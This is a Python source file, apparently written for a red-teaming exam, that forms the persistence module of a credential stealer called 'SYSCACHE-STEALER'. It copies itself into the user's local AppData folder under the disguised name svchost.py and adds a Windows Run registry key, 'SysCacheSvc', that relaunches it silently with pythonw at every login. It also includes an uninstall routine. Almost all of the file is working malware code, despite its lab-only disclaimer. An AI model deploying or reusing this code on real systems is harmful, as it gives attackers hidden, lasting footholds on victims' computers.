#!/usr/bin/env python3
# ============================================================
#  SYSCACHE-STEALER - PERSISTENCE MODULE
#  Red Teaming Exam - ITS Angelo Rizzoli (UFS-19)
#  For educational use in controlled lab environments only.
# ============================================================

import os
import sys
import shutil

try:
    import winreg
except ImportError:
    winreg = None

# --- Configuration -----------------------------------------
APP_NAME      = "SysCacheSvc"
STAGING_DIR   = os.path.join(os.environ.get("LOCALAPPDATA", os.path.expanduser("~")), "SysCache")
STAGED_SCRIPT = os.path.join(STAGING_DIR, "svchost.py")
RUN_KEY       = r"Software\Microsoft\Windows\CurrentVersion\Run"


# --- Helpers -----------------------------------------------
def _ensure_staging_dir():
    os.makedirs(STAGING_DIR, exist_ok=True)


def _stage_payload():
    _ensure_staging_dir()
    current = os.path.abspath(sys.argv[0])
    staged  = os.path.abspath(STAGED_SCRIPT)
    if current.lower() != staged.lower():
        shutil.copy2(current, staged)
    # Also copy persistence.py so the staged script can import it
    this_module = os.path.abspath(__file__)
    staged_module = os.path.join(STAGING_DIR, "persistence.py")
    if this_module.lower() != staged_module.lower():
        shutil.copy2(this_module, staged_module)
    return staged


def _pythonw_path():
    pyw = os.path.join(os.path.dirname(sys.executable), "pythonw.exe")
    return pyw if os.path.exists(pyw) else sys.executable


def _is_registered():
    if winreg is None:
        return False
    try:
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, RUN_KEY, 0, winreg.KEY_READ) as key:
            winreg.QueryValueEx(key, APP_NAME)
            return True
    except (FileNotFoundError, OSError):
        return False


def _register_run_key(script_path):
    if winreg is None:
        return
    command = f'"{_pythonw_path()}" "{script_path}"'
    with winreg.OpenKey(winreg.HKEY_CURRENT_USER, RUN_KEY, 0, winreg.KEY_SET_VALUE) as key:
        winreg.SetValueEx(key, APP_NAME, 0, winreg.REG_SZ, command)


# --- Public API --------------------------------------------
def install():
    if winreg is None:
        return False
    try:
        if _is_registered():
            _stage_payload()
            return True
        staged = _stage_payload()
        _register_run_key(staged)
        return True
    except Exception as e:
        print(f"[-] Persistence install failed: {e}")
        return False


def uninstall():
    if winreg is None:
        return
    try:
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, RUN_KEY, 0, winreg.KEY_SET_VALUE) as key:
            winreg.DeleteValue(key, APP_NAME)
    except (FileNotFoundError, OSError):
        pass
    for path in [STAGED_SCRIPT, os.path.join(STAGING_DIR, "persistence.py")]:
        try:
            if os.path.exists(path):
                os.remove(path)
        except OSError:
            pass
